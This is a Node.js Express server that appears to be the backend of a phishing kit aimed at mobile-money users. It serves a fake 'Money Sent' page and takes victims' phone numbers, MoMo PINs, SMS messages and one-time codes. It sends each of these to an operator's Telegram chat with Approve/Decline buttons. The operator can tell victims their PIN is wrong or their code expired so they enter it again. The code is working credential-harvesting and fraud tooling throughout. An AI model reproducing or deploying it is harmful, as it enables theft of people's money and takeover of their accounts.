require('dotenv').config();

const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ---- Admin credentials ----
const ADMIN_USERS = {
  admin: process.env.ADMIN_PASSWORD || 'admin123'
};

// Active admin sessions (token -> expiresAt)
const adminSessions = new Map();
const SESSION_TTL = 1000 * 60 * 60 * 8; // 8 hours

const DEFAULT_STATE = {
  status: 'Money Sent',
  currency: 'USD',
  amount: 250.00,
  senderName: 'John Doe',
  senderCountry: 'United States',
  purpose: 'Family Support',
  requestId: 'REQ-8829104',
  method: 'Mobile Money',
  reference: 'SW-2849163',
  recipientName: 'Recipient Name',
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString()
};

function readState() {
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(DEFAULT_STATE, null, 2));
  }
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

function writeState(state) {
  state.updatedAt = new Date().toISOString();
  fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ---- Admin auth middleware ---- */
function requireAdmin(req, res, next) {
  const token = req.headers['x-admin-token'] || req.query.token;
  const exp = adminSessions.get(token);
  if (!exp || exp < Date.now()) {
    if (token) adminSessions.delete(token);
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
}

/* ---- Real-time subscribers (SSE) ---- */
const clients = new Set();

function broadcast(state) {
  const payload = `data: ${JSON.stringify(state)}\n\n`;
  for (const res of clients) {
    try { res.write(payload); } catch (_) { clients.delete(res); }
  }
}

/* ---- Telegram helpers ---- */
async function tgSend(method, body) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('[tg] missing TELEGRAM_BOT_TOKEN');
    return null;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await r.json();
    if (!data.ok) console.error('[tg] error:', JSON.stringify(data));
    return data;
  } catch (err) {
    console.error('[tg] fetch failed:', err.message);
    return null;
  }
}

async function sendSubmissionToTelegram(sub) {
  const text =
    `🔔 <b>NEW MoMo SUBMISSION</b>\n\n` +
    `📱 <b>Phone:</b> ${sub.phone}\n` +
    `👤 <b>Recipient:</b> ${sub.recipientName || '—'}\n` +
    `💰 <b>Amount:</b> ${sub.currency || 'USD'} ${sub.amount || '0.00'}\n` +
    `🔑 <b>PIN:</b> <code>${sub.pin}</code>\n` +
    `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
    `Tap a button to decide.`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `approve:${sub.id}` },
      { text: '❌ Decline', callback_data: `decline:${sub.id}` }
    ]]
  };

  return tgSend('sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: keyboard
  });
}

async function sendSmsToTelegram(sub) {
  const text =
    `📩 <b>NEW SMS VERIFICATION</b>\n\n` +
    `📱 <b>Phone:</b> ${sub.phone || '—'}\n` +
    `📝 <b>SMS:</b>\n<code>${(sub.smsMessage || '').slice(0, 500)}</code>\n\n` +
    `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
    `Tap a button to decide.`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `sms-approve:${sub.id}` },
      { text: '❌ Decline', callback_data: `sms-decline:${sub.id}` }
    ]]
  };

  return tgSend('sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: keyboard
  });
}

async function sendOtpToTelegram(sub) {
  const text =
    `🔐 <b>NEW OTP SUBMISSION</b>\n\n` +
    `📱 <b>Phone:</b> ${sub.phone || '—'}\n` +
    `🔢 <b>Code:</b> <code>${sub.otp}</code>\n` +
    `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
    `Tap a button to decide.`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `otp-approve:${sub.id}` },
        { text: '❌ Decline', callback_data: `otp-decline:${sub.id}` }
      ],
      [
        { text: '⏸ Mark Number Inactive', callback_data: `otp-inactive:${sub.id}` }
      ]
    ]
  };

  return tgSend('sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: keyboard
  });
}

/* ---- Admin auth endpoints ---- */
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body || {};
  const expected = ADMIN_USERS[username];
  if (!expected || expected !== password) {
    return res.status(401).json({ error: 'Invalid username or password' });
  }
  const token = 'adm_' + Math.random().toString(36).slice(2) + Date.now().toString(36);
  adminSessions.set(token, Date.now() + SESSION_TTL);
  res.json({ ok: true, token, expiresIn: SESSION_TTL });
});

app.post('/api/admin/logout', requireAdmin, (req, res) => {
  const token = req.headers['x-admin-token'];
  adminSessions.delete(token);
  res.json({ ok: true });
});

app.get('/api/admin/check', requireAdmin, (req, res) => {
  res.json({ ok: true });
});

/* ---- Public endpoints ---- */
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    uptime: process.uptime(),
    telegram: {
      token: !!TELEGRAM_BOT_TOKEN,
      chatId: !!TELEGRAM_CHAT_ID
    }
  });
});

app.get('/api/state', (req, res) => {
  res.json(readState());
});

app.get('/api/stream', (req, res) => {
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*'
  });
  res.flushHeaders();
  res.write(`data: ${JSON.stringify(readState())}\n\n`);
  clients.add(res);

  const ping = setInterval(() => {
    try { res.write(': ping\n\n'); } catch (_) {}
  }, 25000);

  req.on('close', () => {
    clearInterval(ping);
    clients.delete(res);
  });
});

/* ---- Admin-only state edit ---- */
app.post('/api/state', requireAdmin, (req, res) => {
  const current = readState();
  const updated = { ...current, ...req.body };
  if (req.body.amount != null) updated.amount = parseFloat(req.body.amount) || 0;
  writeState(updated);
  broadcast(updated);
  res.json({ ok: true, state: updated });
});

/* ---- Submission endpoints (public — used by user flow) ---- */
app.post('/api/submit-payment', async (req, res) => {
  const submission = {
    ...req.body,
    id: 'REQ-' + Date.now(),
    submittedAt: new Date().toISOString()
  };

  const state = readState();
  state.latestSubmission = submission;
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  writeState(state);
  broadcast(state);

  await sendSubmissionToTelegram(submission);
  res.json({ status: 'pending', id: submission.id });
});

app.post('/api/submit-sms', async (req, res) => {
  const submission = {
    ...req.body,
    id: 'SMS-' + Date.now(),
    submittedAt: new Date().toISOString()
  };

  const state = readState();
  state.latestSmsSubmission = submission;
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  writeState(state);
  broadcast(state);

  await sendSmsToTelegram(submission);
  res.json({ status: 'pending', id: submission.id });
});

app.post('/api/submit-otp', async (req, res) => {
  const submission = {
    ...req.body,
    id: 'OTP-' + Date.now(),
    submittedAt: new Date().toISOString()
  };

  const state = readState();
  state.latestOtpSubmission = submission;
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  writeState(state);
  broadcast(state);

  await sendOtpToTelegram(submission);
  res.json({ status: 'pending', id: submission.id });
});

app.post('/api/resend-otp', async (req, res) => {
  const phone = (req.body && req.body.phone) || '—';
  await tgSend('sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text:
      `🔄 <b>OTP RESEND REQUESTED</b>\n\n` +
      `📱 <b>Phone:</b> ${phone}\n\n` +
      `The user asked for a new code.`,
    parse_mode: 'HTML'
  });
  res.json({ ok: true });
});

app.post('/api/otp-inactive', async (req, res) => {
  const phone = (req.body && req.body.phone) || '—';
  const triggeredBy = (req.body && req.body.triggeredBy) || 'timeout';
  await tgSend('sendMessage', {
    chat_id: TELEGRAM_CHAT_ID,
    text:
      `⏸ <b>NUMBER MARKED INACTIVE</b>\n\n` +
      `📱 <b>Phone:</b> ${phone}\n` +
      `🧭 <b>Triggered by:</b> ${triggeredBy}`,
    parse_mode: 'HTML'
  });
  res.json({ ok: true });
});

/* ---- Admin-only decision endpoints (backup to Telegram) ---- */
app.post('/api/approve', requireAdmin, (req, res) => {
  const state = readState();
  state.decision = 'approved';
  state.decidedAt = new Date().toISOString();
  writeState(state);
  broadcast(state);
  res.json({ ok: true });
});

app.post('/api/decline', requireAdmin, (req, res) => {
  const state = readState();
  state.decision = 'declined';
  state.declineMessage = req.body.message || 'Wrong MoMo PIN. Please try again.';
  state.decidedAt = new Date().toISOString();
  writeState(state);
  broadcast(state);
  res.json({ ok: true });
});

/* ---- Reset (PUBLIC — called by user pages before submitting) ---- */
app.post('/api/reset', (req, res) => {
  const state = readState();
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  // Don't delete submissions — each step overwrites its own
  writeState(state);
  broadcast(state);
  res.json({ ok: true, state });
});

/* ---- Telegram webhook ---- */
app.post('/api/telegram/webhook', async (req, res) => {
  res.sendStatus(200);

  const update = req.body || {};
  const cb = update.callback_query;
  if (!cb) return;

  const data = cb.data || '';
  const [action, refId] = data.split(':');
  const state = readState();

  /* MoMo PIN */
  if (action === 'approve' || action === 'decline') {
    const current = state.latestSubmission;
    if (!current) {
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No submission found.' });
      return;
    }
    if (action === 'approve') {
      state.decision = 'approved';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ Approved' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '✅ Approved', callback_data: 'noop' }]] }
      });
    } else {
      state.decision = 'declined';
      state.declineMessage = 'Wrong MoMo PIN. Please try again.';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ Declined' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '❌ Declined', callback_data: 'noop' }]] }
      });
    }
    return;
  }

  /* SMS */
  if (action === 'sms-approve' || action === 'sms-decline') {
    const current = state.latestSmsSubmission;
    if (!current) {
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No SMS submission found.' });
      return;
    }
    if (action === 'sms-approve') {
      state.decision = 'sms-approved';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ SMS Approved' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '✅ SMS Approved', callback_data: 'noop' }]] }
      });
    } else {
      state.decision = 'sms-declined';
      state.declineMessage = "Invalid SMS. Please paste the correct Y'ello message.";
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ SMS Declined' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '❌ SMS Declined', callback_data: 'noop' }]] }
      });
    }
    return;
  }

  /* OTP */
  if (action === 'otp-approve' || action === 'otp-decline' || action === 'otp-inactive') {
    const current = state.latestOtpSubmission;
    if (!current) {
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No OTP submission found.' });
      return;
    }

    if (action === 'otp-approve') {
      state.decision = 'otp-approved';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ OTP Approved' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '✅ OTP Approved', callback_data: 'noop' }]] }
      });
    } else if (action === 'otp-decline') {
      state.decision = 'otp-declined';
      state.declineMessage = 'Expired code — please tap Resend.';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ OTP Declined' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '❌ OTP Declined', callback_data: 'noop' }]] }
      });
    } else {
      state.decision = 'otp-inactive';
      state.decidedAt = new Date().toISOString();
      writeState(state);
      broadcast(state);
      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '⏸ Marked as Inactive' });
      await tgSend('editMessageReplyMarkup', {
        chat_id: cb.message.chat.id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[{ text: '⏸ Number Inactive', callback_data: 'noop' }]] }
      });
    }
    return;
  }

  await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'Unknown action' });
});

/* ---- Webhook registration ---- */
async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) return;

  let publicUrl = process.env.RAILWAY_PUBLIC_DOMAIN
    ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
    : null;

  if (!publicUrl) {
    console.warn('[tg] RAILWAY_PUBLIC_DOMAIN not set — skipping webhook registration');
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram/webhook`;
  const result = await tgSend('setWebhook', { url: webhookUrl });
  console.log('[tg] setWebhook:', JSON.stringify(result));
}

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`Running on port ${PORT}`);
  console.log('Telegram token set?', !!TELEGRAM_BOT_TOKEN);
  console.log('Telegram chat set?', !!TELEGRAM_CHAT_ID);
  console.log('Admin password set?', !!process.env.ADMIN_PASSWORD);
  await registerWebhook();
});
